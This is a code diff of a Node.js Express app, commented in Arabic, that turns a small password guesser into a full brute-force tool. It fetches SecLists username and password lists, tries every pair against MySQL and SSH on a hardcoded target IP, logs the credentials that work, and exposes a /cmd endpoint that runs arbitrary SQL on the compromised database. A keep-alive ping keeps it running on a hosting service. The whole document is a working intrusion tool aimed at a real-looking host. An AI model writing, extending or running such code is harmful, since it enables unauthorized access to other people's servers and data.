@@ -1,40 +1,57 @@
 const express = require('express');
 const mysql = require('mysql2/promise');
 const { Client } = require('ssh2');
+const fetch = require('node-fetch');
 const app = express();
 const port = process.env.PORT || 10000;
 
 let logs = [];
 let connectedService = null;
 let connectionResult = null;
-
-// كلمات المرور الشائعة للتجريب
-const passwords = ['root', 'admin', '123456', '', 'toor', 'password'];
+let credentials = []; // username + password list
 
 const targetIP = '185.182.193.132';
+
+// روابط لليوزر نيمز والباسوردات
+const usernameListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt';
+const passwordListURL = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
 
 // Ping للحفاظ على تشغيل السيرفر في Render
 setInterval(() => {
   fetch(`https://noon-9v11.onrender.com/`).catch(() => {});
 }, 60_000);
 
+// تحميل بيانات من GitHub
+async function loadCredentials() {
+  const users = await fetch(usernameListURL).then(res => res.text());
+  const passes = await fetch(passwordListURL).then(res => res.text());
+  const usernames = users.split('\n').filter(Boolean);
+  const passwords = passes.split('\n').filter(Boolean);
+  for (const user of usernames) {
+    for (const pass of passwords) {
+      credentials.push({ user, pass });
+    }
+  }
+  logs.push(`📥 تم تحميل ${credentials.length} بيانات تسجيل`);
+}
+
 // تجربة MySQL
 async function tryMySQL() {
-  for (const pass of passwords) {
+  for (const { user, pass } of credentials) {
     try {
       const conn = await mysql.createConnection({
         host: targetIP,
         port: 3306,
-        user: 'root',
+        user,
         password: pass,
       });
       const [rows] = await conn.execute('SHOW DATABASES;');
       connectionResult = rows;
       connectedService = 'MySQL';
-      logs.push(`✅ MySQL Connected with password: "${pass}"`);
+      logs.push(`✅ MySQL Connected - ${user}:${pass}`);
       return;
     } catch (e) {
-      logs.push(`❌ MySQL Failed: ${pass}`);
+      logs.push(`❌ MySQL Failed: ${user}:${pass}`);
     }
   }
 }
@@ -44,26 +61,26 @@ async function trySSH() {
   return new Promise((resolve) => {
     let index = 0;
     const tryNext = () => {
-      if (index >= passwords.length) return resolve();
+      if (index >= credentials.length) return resolve();
       const conn = new Client();
-      const password = passwords[index++];
+      const { user, pass } = credentials[index++];
       conn
         .on('ready', () => {
           connectedService = 'SSH';
-          logs.push(`✅ SSH Connected with password: "${password}"`);
-          connectionResult = 'You can now run commands via /cmd';
+          logs.push(`✅ SSH Connected - ${user}:${pass}`);
+          connectionResult = 'Connected via SSH - يمكنك الآن تنفيذ الأوامر من /cmd';
           conn.end();
           resolve();
         })
         .on('error', () => {
-          logs.push(`❌ SSH Failed: ${password}`);
+          logs.push(`❌ SSH Failed: ${user}:${pass}`);
           tryNext();
         })
         .connect({
           host: targetIP,
           port: 22,
-          username: 'root',
-          password,
+          username: user,
+          password: pass,
           readyTimeout: 5000,
         });
     };
@@ -89,18 +106,21 @@ app.get('/', (req, res) => {
   `);
 });
 
-// تنفيذ أوامر MySQL أو SSH (تجريبي)
+// تنفيذ أوامر MySQL أو SSH
 app.get('/cmd', async (req, res) => {
   const cmd = req.query.q || '';
   if (!connectedService) return res.send('❌ لم يتم الاتصال بأي خدمة بعد');
 
   if (connectedService === 'MySQL') {
+    const { user, pass } = credentials.find(({ user, pass }) =>
+      logs.includes(`✅ MySQL Connected - ${user}:${pass}`)
+    );
     try {
       const conn = await mysql.createConnection({
         host: targetIP,
         port: 3306,
-        user: 'root',
-        password: passwords.find(p => logs.includes(`✅ MySQL Connected with password: "${p}"`)),
+        user,
+        password: pass,
       });
       const [rows] = await conn.execute(cmd);
       return res.send(`<pre>${JSON.stringify(rows, null, 2)}</pre><a href="/">رجوع</a>`);
@@ -109,11 +129,12 @@ app.get('/cmd', async (req, res) => {
     }
   }
 
-  // يمكن تطويره لاحقًا لأوامر SSH
   res.send('🔒 SSH أوامر لم تُفعل بعد - استخدم MySQL فقط الآن');
 });
 
-app.listen(port, () => {
+app.listen(port, async () => {
   logs.push(`🚀 Running on port ${port}`);
-  tryMySQL().then(() => trySSH());
+  await loadCredentials();
+  await tryMySQL();
+  await trySSH();
 });
